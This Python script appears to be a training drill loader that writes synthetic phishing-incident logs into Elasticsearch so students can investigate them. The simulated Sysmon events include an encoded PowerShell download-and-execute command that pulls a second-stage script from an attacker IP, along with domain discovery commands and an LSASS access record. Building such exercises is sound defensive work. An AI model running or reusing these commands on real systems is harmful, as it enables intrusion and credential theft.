#!/usr/bin/env python3
"""
Drill 01 Intermediate — Phishing Incident Scenario Data Loader
Loads a complete scenario into Elasticsearch for student investigation.
"""

import json
import time
import os
import requests

ES_HOST = os.environ.get("ES_HOST", "http://elasticsearch:9200")
ES_USER = os.environ.get("ES_USER", "elastic")
ES_PASS = os.environ.get("ES_PASS", "changeme")

# Base timestamp: 2024-11-18 10:30:00 UTC
BASE_TS = 1731922200

def ts(offset_seconds):
    return BASE_TS + offset_seconds

def send(index, sourcetype, host, timestamp, event):
    payload = {"time": timestamp, "host": host, "index": index,
               "sourcetype": sourcetype, "event": event}
    try:
        r = requests.post(
            f"{ES_HOST}/{index}/_doc",
            json={"timestamp": timestamp, "host": host, "sourcetype": sourcetype, **event},
            auth=(ES_USER, ES_PASS),
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        return r.status_code in (200, 201)
    except Exception as e:
        print(f"Error: {e}")
        return False

def wait_for_es():
    for _ in range(30):
        try:
            r = requests.get(f"{ES_HOST}/_cluster/health",
                             auth=(ES_USER, ES_PASS), timeout=5)
            if r.status_code == 200:
                print("Elasticsearch ready.")
                return True
        except Exception:
            pass
        time.sleep(5)
    return False

# === SCENARIO DATA ===

SCENARIO = [
    # --- Email logs ---
    {
        "index": "email", "sourcetype": "mail:smtp", "host": "MAIL01",
        "ts": ts(2322),  # 11:08:42
        "event": {
            "to_address": "kbaker@medtech.local",
            "from_address": "hr-noreply@medtech-benefits.net",
            "subject": "Important: Your Benefits Enrollment Confirmation Required",
            "sender_ip": "91.200.12.47",
            "attachment_name": "BenefitsEnrollment2024.docm",
            "attachment_hash_sha256": "dead0c0ffee1234567890abcdef1234567890abcdef1234567890abcdef12",
            "spf_result": "FAIL",
            "dkim_result": "FAIL",
            "dmarc_result": "FAIL",
            "dmarc_policy": "none",
            "action": "DELIVERED",
        }
    },
    {
        "index": "email", "sourcetype": "mail:smtp", "host": "MAIL01",
        "ts": ts(2400),
        "event": {
            "to_address": "dpatel@medtech.local",
            "from_address": "hr-noreply@medtech-benefits.net",
            "subject": "Important: Your Benefits Enrollment Confirmation Required",
            "sender_ip": "91.200.12.47",
            "attachment_name": "BenefitsEnrollment2024.docm",
            "attachment_hash_sha256": "dead0c0ffee1234567890abcdef1234567890abcdef1234567890abcdef12",
            "spf_result": "FAIL",
            "dkim_result": "FAIL",
            "dmarc_result": "FAIL",
            "dmarc_policy": "none",
            "action": "DELIVERED",
        }
    },
    # --- Proxy logs (kbaker clicks link) ---
    {
        "index": "proxy", "sourcetype": "proxy:squid", "host": "PROXY01",
        "ts": ts(2340),
        "event": {
            "user": "kbaker", "src_ip": "10.10.1.45",
            "dest_ip": "91.200.12.47", "dest_port": 80,
            "uri": "http://91.200.12.47/benefits/track?id=kb001",
            "http_method": "GET", "status_code": 200,
            "bytes_out": 312, "bytes_in": 67234,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0)"
        }
    },
    # --- Sysmon: macro execution on WS-KBAKER ---
    {
        "index": "sysmon", "sourcetype": "xmlwineventlog:microsoft-windows-sysmon/operational",
        "host": "WS-KBAKER", "ts": ts(2322),
        "event": {
            "EventID": 1, "Computer": "WS-KBAKER", "User": "MEDTECH\\kbaker",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -W Hidden -NonI -NoP -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAXAC4AMgAwADAALgAxADIALgA0ADcALwBwAGEAeQBsAG8AYQBkAC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "ParentCommandLine": "cmd.exe /c powershell.exe -W Hidden -NonI -NoP -Enc SQBFAFgA...",
            "GrandParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "ProcessId": 5421
        }
    },
    # --- Sysmon: C2 connection from WS-KBAKER ---
    {
        "index": "sysmon", "sourcetype": "xmlwineventlog:microsoft-windows-sysmon/operational",
        "host": "WS-KBAKER", "ts": ts(2400),
        "event": {
            "EventID": 3, "Computer": "WS-KBAKER", "User": "MEDTECH\\kbaker",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "DestinationIp": "91.200.12.47", "DestinationPort": 443,
            "Protocol": "tcp", "Initiated": True,
            "SourceIp": "10.10.1.45", "SourcePort": 52341
        }
    },
    # --- Sysmon: discovery commands ---
    {
        "index": "sysmon", "sourcetype": "xmlwineventlog:microsoft-windows-sysmon/operational",
        "host": "WS-KBAKER", "ts": ts(2700),
        "event": {
            "EventID": 1, "Computer": "WS-KBAKER", "User": "MEDTECH\\kbaker",
            "Image": "C:\\Windows\\System32\\net.exe",
            "CommandLine": "net user /domain",
            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        }
    },
    {
        "index": "sysmon", "sourcetype": "xmlwineventlog:microsoft-windows-sysmon/operational",
        "host": "WS-KBAKER", "ts": ts(2724),
        "event": {
            "EventID": 1, "Computer": "WS-KBAKER", "User": "MEDTECH\\kbaker",
            "Image": "C:\\Windows\\System32\\net.exe",
            "CommandLine": "net group \"Domain Admins\" /domain",
            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        }
    },
    # --- Sysmon: LSASS dump ---
    {
        "index": "sysmon", "sourcetype": "xmlwineventlog:microsoft-windows-sysmon/operational",
        "host": "WS-KBAKER", "ts": ts(4800),
        "event": {
            "EventID": 10, "Computer": "WS-KBAKER",
            "SourceImage": "C:\\Windows\\Temp\\svchosts.exe",
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": "0x1010",
            "CallTrace": "ntdll.dll|KERNELBASE.dll|UNKNOWN"
        }
    },
    # --- Winlogs: lateral movement to HR-SRV01 ---
    {
        "index": "winlogs", "sourcetype": "xmlwineventlog:security",
        "host": "HR-SRV01", "ts": ts(5400),
        "event": {
            "EventCode": 4624, "ComputerName": "HR-SRV01",
            "Account_Name": "kbaker", "Account_Domain": "MEDTECH",
            "Logon_Type": 3,
            "Source_Network_Address": "10.10.1.45",
            "Workstation_Name": "WS-KBAKER",
            "Logon_Process": "NtLmSsp"
        }
    },
    # --- Winlogs: file access on HR-SRV01 ---
    {
        "index": "winlogs", "sourcetype": "xmlwineventlog:security",
        "host": "HR-SRV01", "ts": ts(5520),
        "event": {
            "EventCode": 4663, "ComputerName": "HR-SRV01",
            "Account_Name": "kbaker",
            "Object_Name": "\\\\HR-SRV01\\HR\\EmployeeDatabase\\employees_all.xlsx",
            "Access_Mask": "0x1",
            "Object_Type": "File"
        }
    },
    # --- Firewall: exfiltration from HR-SRV01 ---
    {
        "index": "firewall", "sourcetype": "firewall:paloalto", "host": "FW01",
        "ts": ts(5700),
        "event": {
            "src_ip": "10.10.1.45", "src_port": 52900,
            "dest_ip": "91.200.12.47", "dest_port": 443,
            "protocol": "tcp", "action": "allow",
            "bytes_out": 15728640, "bytes_in": 2048,
            "application": "ssl"
        }
    },
    # --- dpatel also clicked (but no execution confirmed) ---
    {
        "index": "proxy", "sourcetype": "proxy:squid", "host": "PROXY01",
        "ts": ts(2520),
        "event": {
            "user": "dpatel", "src_ip": "10.10.1.67",
            "dest_ip": "91.200.12.47", "dest_port": 80,
            "uri": "http://91.200.12.47/benefits/track?id=dp001",
            "http_method": "GET", "status_code": 200,
            "bytes_out": 312, "bytes_in": 67234,
        }
    },
]


def main():
    if not wait_for_es():
        print("Elasticsearch not available")
        return

    print(f"Loading {len(SCENARIO)} scenario events...")
    success = 0
    for evt in SCENARIO:
        if send(evt["index"], evt["sourcetype"], evt["host"], evt["ts"], evt["event"]):
            success += 1

    print(f"Loaded {success}/{len(SCENARIO)} events.")

    # Write hints file
    with open("/tmp/scenario_hints.txt", "w") as f:
        f.write("SCENARIO HINTS (for instructor use)\n")
        f.write("===================================\n")
        f.write("Phishing domain: medtech-benefits.net\n")
        f.write("C2 IP: 91.200.12.47\n")
        f.write("PowerShell payload downloads stage2.ps1 from C2\n")
        f.write("kbaker and dpatel both received phishing email\n")
        f.write("Only kbaker had macro execution confirmed\n")
        f.write("Lateral movement: WS-KBAKER → HR-SRV01 via kbaker account\n")
        f.write("File accessed: employees_all.xlsx (employee PII)\n")
        f.write("Exfiltration: 15 MB transferred to 91.200.12.47:443\n")
        f.write("Severity: P1 (Healthcare PII exfiltration confirmed)\n")

    print("Scenario data loaded. Ready for investigation.")

    while True:
        time.sleep(3600)


if __name__ == "__main__":
    main()
